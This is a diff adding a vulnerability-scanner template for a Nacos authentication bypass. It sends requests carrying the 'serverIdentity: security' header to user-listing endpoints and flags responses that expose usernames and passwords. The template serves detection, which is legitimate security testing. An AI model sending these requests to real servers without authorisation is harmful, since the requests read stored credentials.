@@ -1,0 +1,21 @@
+name: nacos-auth-bypass-2
+groups:
+  path1:
+    - method: GET
+      path: "/nacos/v1/auth/users?pageNo=1&pageSize=9"
+      headers:
+        serverIdentity: security
+      expression: |
+        response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"\"totalCount\":") && response.body.bcontains(b"\"username\":") && response.body.bcontains(b"\"password\":") && response.body.bcontains(b"\"pagesAvailable\":")
+  path2:
+    - method: GET
+      path: "/v1/auth/users?pageNo=1&pageSize=9"
+      headers:
+        serverIdentity: security
+      expression: |
+        response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"\"totalCount\":") && response.body.bcontains(b"\"username\":") && response.body.bcontains(b"\"password\":") && response.body.bcontains(b"\"pagesAvailable\":")
+detail:
+  author: taielab,pikpikcu,SleepingBag945
+  links:
+    - https://github.com/alibaba/nacos/issues/4593
+    - https://nacos.io/en-us/docs/auth.html
